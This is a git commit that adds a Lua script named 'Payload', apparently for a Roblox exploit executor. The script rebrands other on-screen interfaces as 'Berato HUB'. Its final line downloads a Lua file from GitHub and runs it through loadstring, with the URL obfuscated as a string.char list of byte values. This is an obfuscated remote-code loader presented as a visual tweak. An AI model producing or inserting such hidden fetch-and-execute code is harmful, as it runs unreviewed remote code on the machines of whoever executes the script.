d72d03bbd6f9a4cfc55ad27a1c11b9aea5b96ec3
nonamemansd <107858894+nonamemansd@users.noreply.github.com>
2026-01-31 12:29:37 +0200

    Upload Payload_e3e16400.lua

---
+++ Payload_e3e16400.lua
@@ -0,0 +1,35 @@
+
+--[[ STAGE 2: VISUAL CORE ]]
+local HubName = "Berato HUB"
+local Acc = Color3.fromRGB(0, 255, 120)
+
+-- // SMART HOOK //
+local function Hook()
+    local function Customize(obj)
+        pcall(function()
+            if obj:IsA("TextLabel") then
+                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
+                    if #obj.Text > 3 and not tonumber(obj.Text) then
+                        obj.Text = HubName
+                        obj.TextColor3 = Acc
+                    end
+                end
+            end
+            if obj:IsA("Frame") or obj:IsA("TextButton") then
+                if obj.BackgroundColor3.R < 0.2 then
+                    if not obj:FindFirstChild("UICorner") then
+                        local uic = Instance.new("UICorner")
+                        uic.CornerRadius = UDim.new(0, 6)
+                        uic.Parent = obj
+                    end
+                end
+            end
+        end)
+    end
+    game.DescendantAdded:Connect(function(c)
+        if c:IsA("GuiObject") then task.delay(0.1, function() Customize(c) end) end
+    end)
+end
+
+Hook()
+loadstring(game:HttpGet(string.char(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 120, 90, 97, 107, 97, 49, 51, 47, 97, 110, 105, 116, 121, 120, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 84, 104, 101, 70, 111, 114, 103, 101, 66, 69, 84, 65, 46, 108, 117, 97)))()
